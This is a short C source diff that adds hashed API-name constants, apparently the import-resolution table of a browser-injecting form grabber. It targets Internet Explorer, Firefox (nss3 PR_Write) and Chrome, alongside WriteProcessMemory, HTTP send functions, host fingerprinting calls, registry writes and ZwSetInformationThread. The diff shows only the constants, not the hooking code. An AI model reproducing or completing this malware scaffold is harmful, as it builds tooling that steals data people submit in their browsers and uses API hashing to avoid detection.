@@ -14,7 +14,66 @@ with /nodefaultlib switch
 */
 #include<Windows.h>
 
+#define iexplore 0xdeaddea1
+#define firefox 0xdeaddea2
+#define chrome 0xdeaddea3
+#define kernel32 0x8fecd63f
+#define ntdll 0xcef6e822
+#define user32 0x542eee26
+#define advapi32  0x42ccf79f
+#define wininet 0xf22aedd
+#define kernelbase 0x351a452
 
+#define nspr4 0xcf236805
+#define nss3 0xe12f5765
+#define PR_Write 0x68ed94d5
+
+#define chromedll 0x49258fe3
+
+#define _VirtualAlloc 0x91afca54
+#define _GetProcAddress 0x7c0dfcaa
+#define _WriteProcessMemory 0xd83d6aa1
+#define _ReadProcessMemory 0x579d1be9
+#define _VirtualProtect 0x7946c61b
+#define _CreateMutexW 0x4ee4a05b
+#define _HttpSendRequestW 0x2de6beb3
+#define _GetModuleHandleA 0xd3324904
+#define _lstrcpyW 0xcb9b4a11
+#define _lstrcatW 0xcb734651
+#define _lstrcpyA 0xcb9b49fb
+#define _lstrcatA 0xcb73463b
+#define _ExpandEnvironmentStringsW 0xeeb585ee
+#define _lstrcmpW 0xcb534951
+#define _lstrcmpA 0xcb53493b
+#define _CreateFileW 0x7c0017bb
+#define _CloseHandle 0xffd97fb
+#define _GetFileSize 0xdf7d9bad
+#define _ReadFile 0x10fa6516
+#define _WriteFile 0xe80a791f
+#define _VirtualFree 0x30633ac
+#define _ReleaseMutex 0x14a059e5
+#define _CreateProcessW 0x16b3fe88
+#define _TerminateProcess 0x78b5b983
+#define _CreateThread 0xca2bd06b
+#define _Sleep 0xdb2d49b0
+#define _LoadLibraryA 0xec0e4e8e
+#define _RegCreateKeyExW 0x8b64e6ca
+#define _RegCloseKey 0x35e273e6
+#define _RegSetValueExW 0x2d1c9af3
+#define _GetUserNameA 0x5c52aa34
+#define _GetCurrentHwProfileA 0xc15a2595
+#define _GetComputerNameA 0x96a4228f
+#define _wsprintfA 0x57f6bbdb
+#define _GetVersionExW 0xc75fc499
+#define _InternetOpenA 0x57e84429
+#define _InternetConnectA 0x1e4be80e
+#define _HttpOpenRequestA 0xf7de769f
+#define _InternetCloseHandle 0xfa9b69c7
+#define _HttpSendRequestA 0x2de6be9d
+#define _InternetReadFileA 0x5fe34b8b
+#define _CreateFileMappingW 0x56c6123f
+#define _MapViewOfFile 0x7b073c59
+#define _ZwSetInformationThread 0x13dc909d
 
 __declspec (naked) DWORD FFS()
 {
